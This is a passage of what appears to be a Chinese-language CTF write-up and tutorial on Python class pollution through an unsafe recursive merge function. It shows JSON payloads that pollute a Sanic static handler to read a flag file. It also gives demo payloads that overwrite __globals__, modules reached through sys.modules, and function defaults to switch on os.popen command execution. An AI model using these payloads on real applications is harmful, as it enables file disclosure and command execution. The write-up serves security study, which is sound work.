class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​然后访问 <code>/static/73ycOr../</code>  找到了 flag 文件的文件名： <code>45W698WqtsgQT1_flag</code> 。</p><p>​之后污染静态文件目录为根目录，然后访问 <code>/static/app/45W698WqtsgQT1_flag</code>  即可：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​flag: <code>DASCTF&#123;8543c470-d4aa-4668-b051-43ed5c9517b1&#125;</code></p><h1 id="python原型链污染变体跟随article_kelp学"><a class="markdownIt-Anchor" href="#python原型链污染变体跟随article_kelp学">#</a> Python 原型链污染变体 (跟随 Article_kelp 学)</h1><p>​前面的基础已经说过了，这里就跳过了，具体可以看看之前的 merge 函数方面的内容。</p><h2 id="1-更广泛的获取"><a class="markdownIt-Anchor" href="#1-更广泛的获取">#</a> 1、更广泛的获取：</h2><p>​污染类属性是可以通过示例的 <code>__base__</code> 属性查找到其继承的父类，但是如果目标类与切入点类或实例没有继承关系时，这种方法就显得十分无力，代码在上面也早已给出来了。</p><h2 id="2-全局变量的获取"><a class="markdownIt-Anchor" href="#2-全局变量的获取">#</a> 2、全局变量的获取：</h2><p>​在 <code>Python</code>  中，函数或类方法（对于类的内置方法如 <code>__init__</code> 这些来说，内置方法在并未重写时其数据类型为装饰器即 <code>wrapper_descriptor</code> ，只有在重写后才是函数 <code>function</code> ）均具有一个 <code>__globals__</code> 属性，该属性将函数或类方法所申明的变量空间中的全局变量以字典的形式返回（相当于这个变量空间中的 <code>globals</code>  函数的返回值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">a</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">b</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = b()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                <span class="string">&quot;a&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Pooooluted ~&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a.secret_class_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(secret_var)</span><br><span class="line"><span class="comment">#114</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(a.secret_class_var)</span><br><span class="line"><span class="comment">#Pooooluted ~</span></span><br><span class="line"><span class="built_in">print</span>(secret_var)</span><br><span class="line"><span class="comment">#514</span></span><br></pre></td></tr></table></figure><h2 id="3-已加载模块获取"><a class="markdownIt-Anchor" href="#3-已加载模块获取">#</a> 3、已加载模块获取：</h2><p>​局限于当前模块的全局变量获取显然不够，很多情况下需要对并不是定义在入口文件中的类对象或者属性，而我们的操作位置又在入口文件中，这个时候就需要对其他加载过的模块来获取了</p><h3 id="加载关系简单"><a class="markdownIt-Anchor" href="#加载关系简单">#</a> 加载关系简单：</h3><p>​在加载关系简单的情况下，我们可以直接从文件的 <code>import</code>  语法部分找到目标模块，这个时候我们就可以通过获取全局变量来得到目标模块。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> test_1</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;test_1&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                <span class="string">&quot;target_class&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Poluuuuuuted ~&quot;</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#114</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#514</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#Poluuuuuuted ~</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test_1.py</span></span><br><span class="line"></span><br><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target_class</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br></pre></td></tr></table></figure><h3 id="加载关系复杂示例"><a class="markdownIt-Anchor" href="#加载关系复杂示例">#</a> 加载关系复杂–示例：</h3><p>​如 <code>CTF</code>  题目等实际环境中往往是多层模块导入，甚至是存在于内置模块或三方模块中导入，这个时候通过直接看代码文件中 <code>import</code>  语法查找就十分困难，而解决方法则是利用 <code>sys</code>  模块</p><p>​ <code>sys</code>  模块的 <code>modules</code>  属性以字典的形式包含了程序自开始运行时所有已加载过的模块，可以直接从该属性中获取到目标模块.`</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> test_1</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;sys&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;modules&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;test_1&quot;</span> : &#123;</span><br><span class="line">                        <span class="string">&quot;secret_var&quot;</span> : <span class="number">514</span>,</span><br><span class="line">                        <span class="string">&quot;target_class&quot;</span> : &#123;</span><br><span class="line">                            <span class="string">&quot;secret_class_var&quot;</span> : <span class="string">&quot;Poluuuuuuted ~&quot;</span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#secret</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#114</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line"><span class="built_in">print</span>(test_1.secret_var)</span><br><span class="line"><span class="comment">#514</span></span><br><span class="line"><span class="built_in">print</span>(test_1.target_class.secret_class_var)</span><br><span class="line"><span class="comment">#Poluuuuuuted ~</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test_1.py</span></span><br><span class="line"></span><br><span class="line">secret_var = <span class="number">114</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">target_class</span>:</span><br><span class="line">    secret_class_var = <span class="string">&quot;secret&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​当然我们去使用的 <code>Payload</code>  绝大部分情况下是不会这样的，如上的 <code>Payload</code>  实际上是在已经 <code>import sys</code>  的情况下使用的，而大部分情况是没有直接导入的，这样问题就从<strong>寻找 <code>import</code>  特定模块的语句</strong>转换为<strong>寻找 <code>import</code>  了 sys 模块的语句</strong>，对问题解决的并不见得有多少优化</p><h2 id="4-函数形参默认值替换"><a class="markdownIt-Anchor" href="#4-函数形参默认值替换">#</a> 4、函数形参默认值替换：</h2><p>​主要用到了函数的 <code>__defaults__</code> 和 <code>__kwdefaults__</code> 这两个内置属性</p><h4 id="__defaults__"><a class="markdownIt-Anchor" href="#__defaults__">#</a>  <code>__defaults__</code> ：</h4><p>​ <code>__defaults__</code> 以元组的形式按从左到右的顺序收录了函数的位置或键值形参的默认值，需要注意这个位置或键值形参是特定的一类形参，并不是位置形参 + 键值形参，关于函数的参数分类可以参考这篇文章：<span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTIyNzM0NjU=">python 函数的位置参数 (Positional) 和关键字参数 (keyword) - 知乎 (zhihu.com)</span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_a</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_b</span>(<span class="params">var_1, /, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_c</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, *, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_d</span>(<span class="params">var_1, /, var_2 =<span class="number">2</span>, *, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func_a.__defaults__)</span><br><span class="line"><span class="comment">#(2, 3)</span></span><br><span class="line"><span class="built_in">print</span>(func_b.__defaults__)</span><br><span class="line"><span class="comment">#(2, 3)</span></span><br><span class="line"><span class="built_in">print</span>(func_c.__defaults__)</span><br><span class="line"><span class="comment">#(2,)</span></span><br><span class="line"><span class="built_in">print</span>(func_d.__defaults__)</span><br><span class="line"><span class="comment">#(2,)</span></span><br></pre></td></tr></table></figure><p>​通过替换该属性便能实现对函数位置或键值形参的默认值替换，但稍有问题的是该属性值要求为元组类型，而通常的如 <code>JSON</code>  等格式并没有元组这一数据类型设计概念，这就需要环境中有合适的解析输入的方式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">evilFunc</span>(<span class="params">arg_1 , shell = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> shell:</span><br><span class="line">        <span class="built_in">print</span>(arg_1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;evilFunc&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__defaults__&quot;</span> : (</span><br><span class="line">                    <span class="literal">True</span> ,</span><br><span class="line">                )</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment">#whoami</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment">#article-kelp</span></span><br></pre></td></tr></table></figure><h3 id="__kwdefaults__"><a class="markdownIt-Anchor" href="#__kwdefaults__">#</a>  <code>__kwdefaults__</code></h3><p>​ <code>__kwdefaults__</code> 以字典的形式按从左到右的顺序收录了函数键值形参的默认值，从代码上来看，则是如下的效果：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">func_a</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_b</span>(<span class="params">var_1, /, var_2 =<span class="number">2</span>, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_c</span>(<span class="params">var_1, var_2 =<span class="number">2</span>, *, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func_d</span>(<span class="params">var_1, /, var_2 =<span class="number">2</span>, *, var_3 = <span class="number">3</span></span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(func_a.__kwdefaults__)</span><br><span class="line"><span class="comment">#None</span></span><br><span class="line"><span class="built_in">print</span>(func_b.__kwdefaults__)</span><br><span class="line"><span class="comment">#None</span></span><br><span class="line"><span class="built_in">print</span>(func_c.__kwdefaults__)</span><br><span class="line"><span class="comment">#&#123;&#x27;var_3&#x27;: 3&#125;</span></span><br><span class="line"><span class="built_in">print</span>(func_d.__kwdefaults__)</span><br><span class="line"><span class="comment">#&#123;&#x27;var_3&#x27;: 3&#125;</span></span><br></pre></td></tr></table></figure><p>​通过替换该属性便能实现对函数键值形参的默认值替换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">evilFunc</span>(<span class="params">arg_1 , * , shell = <span class="literal">False</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> shell:</span><br><span class="line">        <span class="built_in">print</span>(arg_1)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>).popen(arg_1).read())</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;__init__&quot;</span> : &#123;</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span> : &#123;</span><br><span class="line">            <span class="string">&quot;evilFunc&quot;</span> : &#123;</span><br><span class="line">                <span class="string">&quot;__kwdefaults__&quot;</span> : &#123;</span><br><span class="line">                    <span class="string">&quot;shell&quot;</span> : <span class="literal">True</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment">#whoami</span></span><br><span class="line">merge(payload, instance)</span><br><span class="line">evilFunc(<span class="string">&quot;whoami&quot;</span>)</span><br><span class="line"><span class="comment">#article-kelp</span></span><br></pre></td></tr></table></figure><h2 id="5-secret_key"><a class="markdownIt-Anchor" href="#5-secret_key">#</a> 5、SECRET_KEY：</h2><p>​决定 <code>flask</code>  的 <code>session</code>  生成的重要参数，知道该参数可以实现 <code>session</code>  任意伪造。</p><h1 id="最后的补充"><a class="markdownIt-Anchor" href="#最后的补充">#</a> 最后的补充：</h1><h2 id="1-merge函数"><a class="markdownIt-Anchor" href="#1-merge函数">#</a> 1、merge 函数</h2><p>​首先，在最开始看到 merge 函数的时候，我当时没有仔细看过这个函数的逻辑，现在来分析下这个函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 